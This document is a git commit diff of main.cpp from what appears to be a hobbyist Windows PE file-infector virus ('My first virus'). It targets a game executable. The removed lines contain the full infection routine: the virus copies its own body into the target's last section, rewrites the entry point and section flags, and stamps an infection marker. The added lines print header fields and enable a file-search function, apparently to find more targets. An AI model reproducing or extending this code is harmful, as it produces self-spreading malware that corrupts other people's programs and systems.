aff62e1c385b48b807ddf41bd6708c9b4d973dab
Viktor <nituzal13@mail.ru>
2012-04-12 21:25:02 +0300

    added search funcs v1

--- main.cpp
+++ main.cpp
@@ -17,15 +17,12 @@ bool FindFiles();
 
 int main(int argc, char *argv[])
 {
-	//WIN32_FIND_DATA FindFileData;
-	
-	//Patient
-	char chStr[38] = "c:\\Games\\PES 2011\\pes2011.EXE";
-	//HANDLE hFind = FindFirstFile(CharToWchar(chStr), &FindFileData);
+	char chStr[38] = "c:\\Games\\PES 2011\\pes2011.exe";
 	long w;
 	HANDLE hfPat = CreateFile(CharToWchar(chStr), 0xC0000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 	if(hfPat == INVALID_HANDLE_VALUE) {printf("Open file error!"); CloseHandle(hfPat); return 0; }
 	w = SetFilePointer(hfPat, 0,0,FILE_END);
+	//printf("\nsize virus = %ld",w);
 	HANDLE hMap = CreateFileMapping(hfPat, NULL, PAGE_READWRITE, 0, w, NULL);
 	if(hMap==NULL) {printf("error - hMap"); CloseHandle(hfPat); return 0; }
 	BYTE* hMapAddress = (BYTE*) MapViewOfFile(hMap, 0x02, 0, 0, w);
@@ -35,64 +32,19 @@ int main(int argc, char *argv[])
 
 	if(*((DWORD*)(hPE)) == IMAGE_NT_SIGNATURE) printf("\nsucces");
 	else printf("\nerror PE");
-	if(*((DWORD*)(hPE + 0x4C)) == 0x45673) {MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0); ExitProcess(NULL); }
 
-	DWORD AEP_PAT = *((DWORD*)(hPE + 0x28)), FA = *((DWORD*)(hPE + 0x3C)), IB = *((DWORD*)(hPE + 0x34));
-
+	//*(DWORD*)(hPE + 0x54) = 0x600;
+	DWORD AEP_PAT = *((DWORD*)(hPE + 0x28)), FA = *((DWORD*)(hPE + 0x3C));
+	//printf("\nsize headers = %x\n", GETSIZEOFHEADERS(hPE));
+	printf("\nAddress of entery point = %x\nSize base = %x\nSize of code = %x", *((DWORD*)(hPE + 0x28)),*((DWORD*)(hPE + 0x50)),*((DWORD*)(hPE + 0x1c)));
 	
-	//Virus
-	HANDLE hfVir = CreateFile(CharToWchar(argv[0]), 0x80000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-	if(hfVir == INVALID_HANDLE_VALUE) {printf("Open vir file error!"); CloseHandle(hfVir); return 0; }
-	w = SetFilePointer(hfVir, 0,0,FILE_END);
-	HANDLE hMapVir = CreateFileMapping(hfVir, NULL, PAGE_READONLY, 0, w, NULL);
-	if(hMapVir == NULL) {printf("error - hMap Vir"); CloseHandle(hfVir); return 0; }
-	BYTE* hMapAddressVir = (BYTE*) MapViewOfFile(hMapVir, 0x04, 0, 0, w);
-	if(!hMapAddressVir) {printf("error - hMapAddress Vir"); return 0;}
+	//find last section
 
-	BYTE* hPEVir = (BYTE*)NTSIGNATURE(hMapAddressVir);
 
-	if(*((DWORD*)(hPEVir)) == IMAGE_NT_SIGNATURE) printf("\nsucces Vir");
-	else printf("\nerror PEVir");
-
-	DWORD AEP_VIR = *((DWORD*)(hPE + 0x28)), IS_VIR = *((DWORD*)(hPE + 0x50));
-	
-	// Infection
-
-	BYTE* hLS = pLastSection(hPE);
-	//printf("Pointer = %x\nVA = %x\nIS PAT = %x\nIS VIr = %x",*((DWORD*)(hLS + 0x14)),*((DWORD*)(hLS + 0x0C)),*((DWORD*)(hPE + 0x50)),*((DWORD*)(hPEVir + 0x50)));
-	DWORD szRD = *((DWORD*)(hLS + 0x10)), newszRD = 0;
-	newszRD = szRD + IS_VIR;
-	newszRD = ALIGN_UP(newszRD, FA);
-	*((DWORD*)(hLS + 0x10)) = newszRD;
-	*((DWORD*)(hLS + 0x8)) = newszRD;
-
-	DWORD ptrEndLS = szRD + *((DWORD*)(hLS + 0x14));
-	DWORD newAEP = szRD + *((DWORD*)(hLS + 0x0C));
-	*((DWORD*)(hPE + 0x28)) = newAEP + AEP_VIR;
-	*((DWORD*)(hPE + 0x50)) = *((DWORD*)(hLS + 0x0C)) + newszRD;
-	*((DWORD*)(hLS + 0x24)) = 0xA0000020;
-
-	*((DWORD*)(hPE + 0x4C)) = 0x45673;
-
-	SetFilePointer(hfPat, ptrEndLS, 0,FILE_BEGIN);
-	SetFilePointer(hfVir, 0, 0,FILE_BEGIN);
-
-	DWORD wr;
-	char buf[1024];
-	while(1)
-	{
-		ReadFile(hfVir,buf, 1024, &wr, NULL);
-		WriteFile(hfPat, buf, wr, &wr, NULL);
-		if(wr < 1024) break;
-	};
-	*((DWORD*)(hPE + 0x34 + ptrEndLS)) = ptrEndLS;
-	//Close Handles
 	
 	UnmapViewOfFile(hMapAddress);
 	CloseHandle(hfPat);
-	UnmapViewOfFile(hMapAddressVir);
-	CloseHandle(hfVir);
-	//if (!FindFiles()) return 0;
+	if (!FindFiles()) return 0;
 	getch();
 	return 1;	
 
